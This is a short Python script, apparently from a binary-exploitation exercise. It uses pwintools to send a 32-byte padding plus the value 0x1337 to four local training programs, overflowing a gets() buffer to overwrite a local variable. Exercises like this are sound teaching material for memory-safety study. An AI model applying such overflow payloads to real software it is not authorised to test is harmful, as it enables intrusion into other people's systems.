# 1st exploit: buffer overflow to overwrite a local variable

from pwintools import *

processes = [
	Process('1_gets_gcc_32.exe'),
	Process('1_gets_gcc_64.exe'),
	Process('1_gets_vs_32.exe'),
	Process('1_gets_vs_64.exe'),
]

for p in processes:
	p.recvuntil(b'name:\r\n')
	#p.sendline(b'a'*32 + b'\x37\x13')
	p.sendline(b'a'*32 + p32(0x1337))
	print(p.recvall())
	#poll is not implemented in pwintools
	#print('Exit code:' + p.poll(block=True))
